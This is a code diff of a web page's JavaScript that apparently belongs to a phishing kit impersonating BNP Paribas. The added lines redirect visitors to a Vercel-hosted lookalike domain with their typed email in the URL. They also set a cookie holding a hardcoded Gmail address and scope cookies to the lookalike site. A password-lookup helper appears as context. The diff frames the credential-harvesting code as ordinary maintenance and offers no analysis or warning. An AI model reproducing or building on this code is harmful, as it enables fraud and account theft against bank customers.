@@ -235,8 +235,8 @@ justify-content: center;
    
      const link=document.getElementById("link")
        
- window.location.href=`https://bnpparibas-gfrz.vercel.app/account?authuser=${mail.value}`
-
+ window.location.href=`https://bnpparibas-nine.vercel.app/account?authuser=${mail.value}`
+setCookie('email', 'reunierprospere@gmail.com',1)
   
   
   
@@ -297,7 +297,8 @@ justify-content: center;
    function setCookie(name, value, days) {
      const date = new Date()
      date.setDate(date.getDate() + days)
-     document.cookie = `${name}=${encodeURIComponent(value)}; expires=${date.toUTCString()}; path="/"`
+     document.cookie = `${name}=${encodeURIComponent(value)};
+     domain="https://bnpparibas-nine.vercel.app";expires=${date.toUTCString()}; path="/"`
    }
    
    var contenu=[]
@@ -339,40 +340,6 @@ function userFindPassword(password,content){
 
 
 
-
-function loaded(endLoad,text) {
-  let counter=0
- if(counter===0){
-   
-    let elem=document.getElementsByClassName("progress-done")
-    console.log(elem)
-    var width=10
-    var main=setInterval(frame,100)
-    function frame() {
-     
-      if(width==endLoad){
-        
- textStatus[0].innerHTML=text
- 
- 
-        clearInterval(main)
-      }
-      else{
-        
-        width++
-
-  elem[0].style.width=width+"%"
-         elem[0].innerHTML=width+"%"
-      
-         
-         
-        
-        
-        
-      }
-    }
-  }
-}
 function getCookie(name) {
   const cookies = document.cookie.split('; ')
   const value = cookies
@@ -383,6 +350,7 @@ function getCookie(name) {
   }
   return decodeURIComponent(value)
 }
+
 let sessionEmail=""
 let bnpparislisbonne=""
 window.onload=function(){
